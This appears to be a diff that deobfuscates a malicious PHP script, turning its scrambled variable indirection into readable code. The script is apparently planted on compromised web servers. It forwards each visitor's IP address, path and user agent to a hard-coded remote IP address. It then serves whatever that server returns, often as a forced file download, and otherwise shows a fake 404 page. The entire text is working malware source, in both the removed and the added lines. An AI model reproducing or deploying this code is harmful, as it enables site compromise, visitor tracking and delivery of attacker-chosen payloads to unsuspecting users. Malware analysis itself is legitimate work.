@@ -24,12 +24,8 @@ $cnuludt = "remote";
 $nxdjnqjioi = "remote";
 error_reporting(0);
 ini_set("display_errors", 0);
-$ {
-    $GLOBALS["cnuludt"]
-} = "http://78.138.118.127/12345nbvvd.php";
-php_display($ {
-    $GLOBALS["nxdjnqjioi"]
-});
+$remote = "http://78.138.118.127/12345nbvvd.php";
+php_display($remote);
 error_404();
 function php_display($url) {
     $dupvctxile = "query";
@@ -38,62 +34,34 @@ function php_display($url) {
     $scmukqrpcu = "filename";
     $pefiihqr = "content";
     $pzqscfbwfoo = "query";
-    $ {
-        $GLOBALS["dupvctxile"]
-    } = array();
-    $ {
-        $GLOBALS["lvdzxnelv"]
-    }
+    $query = array();
+    $query
     ["ip"] = getIp();
-    $ {
-        $GLOBALS["lvdzxnelv"]
-    }
+    $query
     ["path"] = "$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
     $ {
         $pzqscfbwfoo
     }
     ["useragent"] = getUseragent();
-    $ {
-        $GLOBALS["sbmrxr"]
-    } = $ {
-        $GLOBALS["sbmrxr"]
-    } . "?" . http_build_query($ {
-        $GLOBALS["lvdzxnelv"]
-    });
+    $url = $url . "?" . http_build_query($query);
     $ykymhewdris = "content";
-    $ {
-        $GLOBALS["ukpxsfnrdit"]
-    } = @file_get_contents($ {
-        $GLOBALS["rtuqjngevwue"]
-    });
-    if (strlen($ {
-        $GLOBALS["ykymhewdris"]
-    }) < 10) {
+    $content = @file_get_contents($url);
+    if (strlen($content) < 10) {
         error_404();
     }
     $wpkyut = "content";
-    $ {
-        $GLOBALS["ukpxsfnrdit"]
-    } = explode("
+    $content = explode("
 ", $ {
         $rbdxeeg
     });
     $pesdfbe = "content";
     $uflmer = "filename";
-    $ {
-        $GLOBALS["scmukqrpcu"]
-    } = array_shift($ {
-        $GLOBALS["pefiihqr"]
-    });
-    $ {
-        $GLOBALS["ukpxsfnrdit"]
-    } = implode("
+    $filename = array_shift($content);
+    $content = implode("
 ", $ {
         $wpkyut
     });
-    if (strstr($ {
-        $GLOBALS["uflmer"]
-    }, ".html") === FALSE) {
+    if (strstr($filename, ".html") === FALSE) {
         $wsluapls = "content";
         $iakxulxikk = "type";
         $ijffdbx = "type";
@@ -101,9 +69,7 @@ function php_display($url) {
         $ {
             $ijffdbx
         } = "application/octet-stream";
-        header("Content-Type:" . $ {
-            $GLOBALS["iakxulxikk"]
-        });
+        header("Content-Type:" . $type);
         header("Content-Disposition: attachment; filename=" . $ {
             $liobqfzecv
         });
@@ -111,9 +77,7 @@ function php_display($url) {
             $wsluapls
         }));
     }
-    echo $ {
-        $GLOBALS["pesdfbe"]
-    };
+    echo $content;
     exit();
 }
 function http_request($params) {
@@ -126,14 +90,8 @@ function http_request($params) {
     $rjfobnk = "params";
     $fdyymehuojn = "url";
     $btcrda = "url";
-    if (!is_array($ {
-        $GLOBALS["jmprtlkqy"]
-    })) {
-        $ {
-            $GLOBALS["omumddjkm"]
-        } = array("url" => $ {
-            $GLOBALS["omumddjkm"]
-        }, "method" => "GET");
+    if (!is_array($params)) {
+        $params = array("url" => $params, "method" => "GET");
     }
     $qiqgvuce = "url";
     $lrhituc = "url";
@@ -141,9 +99,7 @@ function http_request($params) {
     $dtizvq = "params";
     $gipmkeuwhen = "url";
     $sckbeqtg = "url";
-    if ($ {
-        $GLOBALS["omumddjkm"]
-    }
+    if ($params
     ["url"] == "") return FALSE;
     $wywwrkacw = "url";
     $iygwzasprs = "params";
@@ -151,39 +107,27 @@ function http_request($params) {
     $xlqroqbdsxr = "params";
     $flcyorqsb = "timeout";
     $ulvgvufr = "params";
-    if (!isset($ {
-        $GLOBALS["ulvgvufr"]
-    }
+    if (!isset($params
     ["method"])) $ {
         $dtizvq
     }
     ["method"] = (isset($ {
         $rjfobnk
     }
-    ["data"]) && is_array($ {
-        $GLOBALS["omumddjkm"]
-    }
+    ["data"]) && is_array($params
     ["data"])) ? "POST" : "GET";
     $ {
         $xlqroqbdsxr
     }
-    ["method"] = strtoupper($ {
-        $GLOBALS["omumddjkm"]
-    }
+    ["method"] = strtoupper($params
     ["method"]);
-    if (!in_array($ {
-        $GLOBALS["omumddjkm"]
-    }
+    if (!in_array($params
     ["method"], array("GET", "POST"))) return FALSE;
-    $ {
-        $GLOBALS["sbmrxr"]
-    } = parse_url($ {
+    $url = parse_url($ {
         $iygwzasprs
     }
     ["url"]);
-    if (!isset($ {
-        $GLOBALS["sckbeqtg"]
-    }
+    if (!isset($url
     ["scheme"])) $ {
         $fdyymehuojn
     }
@@ -191,101 +135,61 @@ function http_request($params) {
     if (!isset($ {
         $wywwrkacw
     }
-    ["path"])) $ {
-        $GLOBALS["sbmrxr"]
-    }
+    ["path"])) $url
     ["path"] = "/";
-    if (!isset($ {
-        $GLOBALS["lrhituc"]
-    }
-    ["host"]) && isset($ {
-        $GLOBALS["sbmrxr"]
-    }
+    if (!isset($url
+    ["host"]) && isset($url
     ["path"])) {
-        if (strpos($ {
-            $GLOBALS["sbmrxr"]
-        }
+        if (strpos($url
         ["path"], "/")) {
             $jzjmvnjmjak = "url";
             $ebxrctpqzyke = "url";
             $lqniscmceeu = "url";
-            $ {
-                $GLOBALS["sbmrxr"]
-            }
-            ["host"] = substr($ {
-                $GLOBALS["sbmrxr"]
-            }
+            $url
+            ["host"] = substr($url
             ["path"], 0, strpos($ {
                 $jzjmvnjmjak
             }
             ["path"], "/"));
-            $ {
-                $GLOBALS["sbmrxr"]
-            }
-            ["path"] = substr($ {
-                $GLOBALS["ebxrctpqzyke"]
-            }
+            $url
+            ["path"] = substr($url
             ["path"], strpos($ {
                 $lqniscmceeu
             }
             ["path"], "/"));
         } else {
-            $ {
-                $GLOBALS["sbmrxr"]
-            }
-            ["host"] = $ {
-                $GLOBALS["sbmrxr"]
-            }
+            $url
+            ["host"] = $url
             ["path"];
-            $ {
-                $GLOBALS["sbmrxr"]
-            }
+            $url
             ["path"] = "/";
         }
     }
     $yijslrmkos = "port";
     $eixfozyikgx = "res";
-    $ {
-        $GLOBALS["sbmrxr"]
-    }
-    ["path"] = preg_replace("/[\/]+/", "/", $ {
-        $GLOBALS["sbmrxr"]
-    }
+    $url
+    ["path"] = preg_replace("/[\/]+/", "/", $url
     ["path"]);
     $razoyonw = "errno";
-    if (isset($ {
-        $GLOBALS["qiqgvuce"]
-    }
+    if (isset($url
     ["query"])) $ {
         $sxbpdcgbnhv
     }
     ["path"].= "?{$url['query']}";
-    $ {
-        $GLOBALS["qlmcbwop"]
-    } = isset($ {
+    $port = isset($ {
         $ipttjthk
     }
-    ["port"]) ? $ {
-        $GLOBALS["adlbtpkkp"]
-    }
+    ["port"]) ? $params
     ["port"] : (isset($ {
         $sduxjksgmdh
     }
     ["port"]) ? $ {
         $btcrda
     }
-    ["port"] : ($ {
-        $GLOBALS["gipmkeuwhen"]
-    }
+    ["port"] : ($url
     ["scheme"] == "https" ? 443 : 80));
-    $ {
-        $GLOBALS["kcxyrjcxhn"]
-    } = isset($ {
-        $GLOBALS["omumddjkm"]
-    }
-    ["timeout"]) ? $ {
-        $GLOBALS["omumddjkm"]
-    }
+    $timeout = isset($params
+    ["timeout"]) ? $params
     ["timeout"] : 30;
     $vfxzzxxo = "fp";
     $bqkboh = "url";
@@ -293,35 +197,21 @@ function http_request($params) {
     if (!isset($ {
         $vmvvwyx
     }
-    ["return"])) $ {
-        $GLOBALS["omumddjkm"]
-    }
+    ["return"])) $params
     ["return"] = "content";
     $ {
         $qqroevys
-    } = $ {
-        $GLOBALS["dwjwlpw"]
-    }
+    } = $url
     ["scheme"] == "https" ? "ssl://" : "";
-    $ {
-        $GLOBALS["gplirongicj"]
-    } = @fsockopen($ {
-        $GLOBALS["pkedokwhjf"]
-    } . $ {
-        $GLOBALS["bqkboh"]
-    }
+    $fp = @fsockopen($scheme . $url
     ["host"], $ {
         $yijslrmkos
     }, $ {
         $razoyonw
-    }, $ {
-        $GLOBALS["nvmidautnev"]
-    }, $ {
+    }, $errstr, $ {
         $flcyorqsb
     });
-    if ($ {
-        $GLOBALS["vfxzzxxo"]
-    }) {
+    if ($fp) {
         $tshdxkrjg = "headers";
         $kccwgjcfzry = "params";
         $ahzbto = "request";
@@ -329,47 +219,33 @@ function http_request($params) {
         if (!isset($ {
             $kccwgjcfzry
         }
-        ["User-Agent"])) $ {
-            $GLOBALS["jrpbrhfchpi"]
-        }
+        ["User-Agent"])) $params
         ["User-Agent"] = "Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16";
         $pojdifufqxn = "params";
         $qnklxgjjj = "fp";
         $wyjfestoo = "request";
-        $ {
-            $GLOBALS["htahytknrfy"]
-        } = "{$params['method']} {$url['path']} HTTP/1.0
+        $request = "{$params['method']} {$url['path']} HTTP/1.0
 ";
-        $ {
-            $GLOBALS["wyjfestoo"]
-        }.= "Host: {$url['host']}
+        $request.= "Host: {$url['host']}
 ";
         $edugfoonj = "h_detected";
-        $ {
-            $GLOBALS["ahzbto"]
-        }.= "User-Agent: {$params['User-Agent']}" . "
+        $request.= "User-Agent: {$params['User-Agent']}" . "
 ";
         $bbrvfdiqc = "request";
         $nqdhraem = "data";
         if (isset($ {
             $pojdifufqxn
         }
-        ["referer"])) $ {
-            $GLOBALS["htahytknrfy"]
-        }.= "Referer: {$params['referer']}
+        ["referer"])) $request.= "Referer: {$params['referer']}
 ";
-        if (isset($ {
-            $GLOBALS["omumddjkm"]
-        }
+        if (isset($params
         ["cookie"])) {
             $dtxmecwodrd = "cookie";
             $djntfik = "cookie";
             $ {
                 $djntfik
             } = "";
-            if (is_array($ {
-                $GLOBALS["omumddjkm"]
-            }
+            if (is_array($params
             ["cookie"])) {
                 $ycbsvqo = "cookie";
                 $awskkwmqqpg = "k";
@@ -379,29 +255,15 @@ function http_request($params) {
                 foreach ($ {
                     $hgtshwshin
                 }
-                ["cookie"] as $ {
-                    $GLOBALS["awskkwmqqpg"]
-                } => $ {
-                    $GLOBALS["sptbdqe"]
-                }) $ {
-                    $GLOBALS["ycbsvqo"]
-                }.= "$k=$v; ";
+                ["cookie"] as $k => $v) $cookie.= "$k=$v; ";
                 $ {
                     $rqgoxxlohwl
                 } = substr($ {
                     $gvqqpvmbynrb
                 }, 0, -2);
-            } else $ {
-                $GLOBALS["dtxmecwodrd"]
-            } = $ {
-                $GLOBALS["omumddjkm"]
-            }
+            } else $cookie = $params
             ["cookie"];
-            if ($ {
-                $GLOBALS["fqyjjt"]
-            } != "") $ {
-                $GLOBALS["htahytknrfy"]
-            }.= "Cookie: $cookie
+            if ($cookie != "") $request.= "Cookie: $cookie
 ";
         }
         $xrpkvnq = "request";
@@ -409,9 +271,7 @@ function http_request($params) {
             $xrpkvnq
         }.= "Connection: close
 ";
-        if ($ {
-            $GLOBALS["omumddjkm"]
-        }
+        if ($params
         ["method"] == "POST") {
             $hppnxos = "params";
             $xfowerivgy = "params";
@@ -427,83 +287,49 @@ function http_request($params) {
                 $piwbdshpsstj = "data";
                 $erfrgfxmygs = "data";
                 $lkgftnl = "k";
-                foreach ($ {
-                    $GLOBALS["omumddjkm"]
-                }
+                foreach ($params
                 ["data"] AS $ {
                     $lkgftnl
-                } => $ {
-                    $GLOBALS["sptbdqe"]
-                }) $ {
-                    $GLOBALS["piwbdshpsstj"]
-                }.= urlencode($ {
-                    $GLOBALS["xkhabq"]
-                }) . "=" . urlencode($ {
-                    $GLOBALS["sptbdqe"]
-                }) . "&";
+                } => $v) $data.= urlencode($k) . "=" . urlencode($v) . "&";
                 $jtgyocys = "data";
-                if (substr($ {
-                    $GLOBALS["erfrgfxmygs"]
-                }, -1) == "&") $ {
+                if (substr($data, -1) == "&") $ {
                     $jtgyocys
-                } = substr($ {
-                    $GLOBALS["auexxenf"]
-                }, 0, -1);
+                } = substr($data, 0, -1);
             }
-            $ {
-                $GLOBALS["auexxenf"]
-            }.= "
+            $data.= "
 
 ";
-            $ {
-                $GLOBALS["htahytknrfy"]
-            }.= "Content-type: application/x-www-form-urlencoded
+            $request.= "Content-type: application/x-www-form-urlencoded
 ";
-            $ {
-                $GLOBALS["htahytknrfy"]
-            }.= "Content-length: " . strlen($ {
+            $request.= "Content-length: " . strlen($ {
                 $ycvslrfdjhn
             }) . "
 ";
         }
-        $ {
-            $GLOBALS["htahytknrfy"]
-        }.= "
+        $request.= "
 ";
-        if ($ {
-            $GLOBALS["omumddjkm"]
-        }
-        ["method"] == "POST") $ {
-            $GLOBALS["htahytknrfy"]
-        }.= $ {
+        if ($params
+        ["method"] == "POST") $request.= $ {
             $nqdhraem
         };
         $rlmagcoondi = "fp";
-        @fwrite($ {
-            $GLOBALS["gplirongicj"]
-        }, $ {
+        @fwrite($fp, $ {
             $bbrvfdiqc
         });
-        $ {
-            $GLOBALS["yymuyny"]
-        } = "";
+        $res = "";
         $ {
             $tshdxkrjg
         } = "";
         $ {
             $edugfoonj
         } = false;
-        while (!@feof($ {
-            $GLOBALS["rlmagcoondi"]
-        })) {
+        while (!@feof($fp)) {
             $fxzuahsbp = "res";
             $egvgmmxsuux = "h_detected";
             $nlsygkhpdyyn = "res";
             $ {
                 $nlsygkhpdyyn
-            }.= @fread($ {
-                $GLOBALS["gplirongicj"]
-            }, 1024);
+            }.= @fread($fp, 1024);
             if (!$ {
                 $egvgmmxsuux
             } && strpos($ {
@@ -520,16 +346,10 @@ function http_request($params) {
                 $yergdqrcv = "params";
                 $jqqelrlzroq = "params";
                 $gwoscntyun = "res";
-                $ {
-                    $GLOBALS["uloxirw"]
-                } = true;
+                $h_detected = true;
                 $ {
                     $qmvftez
-                } = substr($ {
-                    $GLOBALS["gokexypfnnju"]
-                }, 0, strpos($ {
-                    $GLOBALS["ivynppi"]
-                }, "
+                } = substr($res, 0, strpos($res, "
 
 "));
                 $qnwjrwbxalvq = "headers";
@@ -537,11 +357,7 @@ function http_request($params) {
                 $jtjcghsyvtc = "params";
                 $ {
                     $sykrwe
-                } = substr($ {
-                    $GLOBALS["gwoscntyun"]
-                }, strpos($ {
-                    $GLOBALS["yymuyny"]
-                }, "
+                } = substr($res, strpos($res, "
 
 ") + 4);
                 if ($ {
@@ -550,160 +366,78 @@ function http_request($params) {
                 ["return"] == "headers" || $ {
                     $jtjcghsyvtc
                 }
-                ["return"] == "array" || (isset($ {
-                    $GLOBALS["jqqelrlzroq"]
-                }
-                ["redirect"]) && $ {
-                    $GLOBALS["omumddjkm"]
-                }
+                ["return"] == "array" || (isset($params
+                ["redirect"]) && $params
                 ["redirect"] == true)) {
                     $yjqqdvupnm = "v";
                     $mnbxxtkm = "headers";
                     $dvxenchgyqp = "headers";
-                    $ {
-                        $GLOBALS["qzuuekdfv"]
-                    } = explode("
+                    $h = explode("
 ", $ {
                         $mnbxxtkm
                     });
                     $ {
                         $dvxenchgyqp
                     } = array();
-                    foreach ($ {
-                        $GLOBALS["qzuuekdfv"]
-                    } as $ {
-                        $GLOBALS["idhnrebodii"]
-                    } => $ {
+                    foreach ($h as $k => $ {
                         $yjqqdvupnm
                     }) {
-                        if (strpos($ {
-                            $GLOBALS["sptbdqe"]
-                        }, ":")) {
+                        if (strpos($v, ":")) {
                             $ckdqikcutle = "v";
                             $mnmykww = "v";
                             $ugrcqmpr = "k";
-                            $ {
-                                $GLOBALS["ugrcqmpr"]
-                            } = substr($ {
-                                $GLOBALS["sptbdqe"]
-                            }, 0, strpos($ {
-                                $GLOBALS["ckdqikcutle"]
-                            }, ":"));
-                            $ {
-                                $GLOBALS["sptbdqe"]
-                            } = trim(substr($ {
-                                $GLOBALS["sptbdqe"]
-                            }, strpos($ {
-                                $GLOBALS["mnmykww"]
-                            }, ":") + 1));
+                            $k = substr($v, 0, strpos($v, ":"));
+                            $v = trim(substr($v, strpos($v, ":") + 1));
                         }
-                        $ {
-                            $GLOBALS["khvfrulzr"]
-                        }
-                        [strtoupper($ {
-                            $GLOBALS["idhnrebodii"]
-                        }) ] = $ {
-                            $GLOBALS["sptbdqe"]
-                        };
+                        $headers
+                        [strtoupper($k) ] = $v;
                     }
                 }
-                if (isset($ {
-                    $GLOBALS["wigpbx"]
-                }
-                ["redirect"]) && $ {
-                    $GLOBALS["yergdqrcv"]
-                }
+                if (isset($params
+                ["redirect"]) && $params
                 ["redirect"] == true && isset($ {
                     $qnwjrwbxalvq
                 }
                 ["LOCATION"])) {
                     $iweqfuxdlggh = "params";
                     $ljrsgsxuvv = "params";
-                    $ {
-                        $GLOBALS["omumddjkm"]
-                    }
-                    ["url"] = $ {
-                        $GLOBALS["khvfrulzr"]
-                    }
+                    $params
+                    ["url"] = $headers
                     ["LOCATION"];
-                    if (!isset($ {
-                        $GLOBALS["omumddjkm"]
-                    }
-                    ["redirect-count"])) $ {
-                        $GLOBALS["iweqfuxdlggh"]
-                    }
+                    if (!isset($params
+                    ["redirect-count"])) $params
                     ["redirect-count"] = 0;
-                    if ($ {
-                        $GLOBALS["ljrsgsxuvv"]
-                    }
+                    if ($params
                     ["redirect-count"] < 10) {
                         $wrdyls = "func";
-                        $ {
-                            $GLOBALS["omumddjkm"]
-                        }
+                        $params
                         ["redirect-count"]++;
-                        $ {
-                            $GLOBALS["ysfyfo"]
-                        } = __FUNCTION__;
+                        $func = __FUNCTION__;
                         $pjpsowtwymf = "func";
                         $ggqvmdh = "params";
-                        return @is_object($this) ? $this->$ {
-                            $GLOBALS["wrdyls"]
-                        }
-                        ($ {
-                            $GLOBALS["ggqvmdh"]
-                        }) : $ {
-                            $GLOBALS["pjpsowtwymf"]
-                        }
-                        ($ {
-                            $GLOBALS["omumddjkm"]
-                        });
+                        return @is_object($this) ? $this->$func
+                        ($params) : $func
+                        ($params);
                     }
                 }
-                if ($ {
-                    $GLOBALS["omumddjkm"]
-                }
-                ["return"] == "headers") return $ {
-                    $GLOBALS["khvfrulzr"]
-                };
+                if ($params
+                ["return"] == "headers") return $headers;
             }
         }
         @fclose($ {
             $qnklxgjjj
         });
     } else return FALSE;
-    if ($ {
-        $GLOBALS["omumddjkm"]
-    }
-    ["return"] == "array") $ {
-        $GLOBALS["yetbvsgk"]
-    } = array("headers" => $ {
-        $GLOBALS["khvfrulzr"]
-    }, "content" => $ {
-        $GLOBALS["yymuyny"]
-    });
-    return $ {
-        $GLOBALS["eixfozyikgx"]
-    };
+    if ($params
+    ["return"] == "array") $res = array("headers" => $headers, "content" => $res);
+    return $res;
 }
 function error_404() {
     header("HTTP/1.1 404 Not Found");
-    $ {
-        $GLOBALS["xfxfcd"]
-    } = preg_replace("/(\?).*\$/", "", $_SERVER["REQUEST_URI"]);
-    $ {
-        $GLOBALS["ukpxsfnrdit"]
-    } = http_request("http://" . $_SERVER["SERVER_NAME"] . "/AFQjCNHnh8RttFI3VMrBddYw6rngKz7KEA");
-    $ {
-        $GLOBALS["ukpxsfnrdit"]
-    } = str_replace("/AFQjCNHnh8RttFI3VMrBddYw6rngKz7KEA", $ {
-        $GLOBALS["xfxfcd"]
-    }, $ {
-        $GLOBALS["ukpxsfnrdit"]
-    });
-    exit($ {
-        $GLOBALS["ukpxsfnrdit"]
-    });
+    $uri = preg_replace("/(\?).*\$/", "", $_SERVER["REQUEST_URI"]);
+    $content = http_request("http://" . $_SERVER["SERVER_NAME"] . "/AFQjCNHnh8RttFI3VMrBddYw6rngKz7KEA");
+    $content = str_replace("/AFQjCNHnh8RttFI3VMrBddYw6rngKz7KEA", $uri, $content);
+    exit($content);
 }
 function getUseragent() {
     return $_SERVER["HTTP_USER_AGENT"];
@@ -724,27 +458,17 @@ function getIp() {
         $zizlckd
     } = NULL;
     if (isset($_SERVER["REMOTE_ADDR"])) {
-        $ {
-            $GLOBALS["hczmyccqa"]
-        } = $_SERVER["REMOTE_ADDR"];
+        $ip = $_SERVER["REMOTE_ADDR"];
     }
     $ygtqpkoosnxt = "ip";
-    if (strpos($ {
-        $GLOBALS["hczmyccqa"]
-    }, ",") !== FALSE) {
+    if (strpos($ip, ",") !== FALSE) {
         $vzzhnqeuoit = "ip";
         $mujjczjqc = "ips";
         $vijvmqe = "ip";
-        $ {
-            $GLOBALS["mujjczjqc"]
-        } = explode(",", $ {
-            $GLOBALS["vzzhnqeuoit"]
-        });
+        $ips = explode(",", $ip);
         $ {
             $vijvmqe
-        } = trim(array_pop($ {
-            $GLOBALS["jbtvcvf"]
-        }));
+        } = trim(array_pop($ips));
     }
     return $ {
         $ygtqpkoosnxt
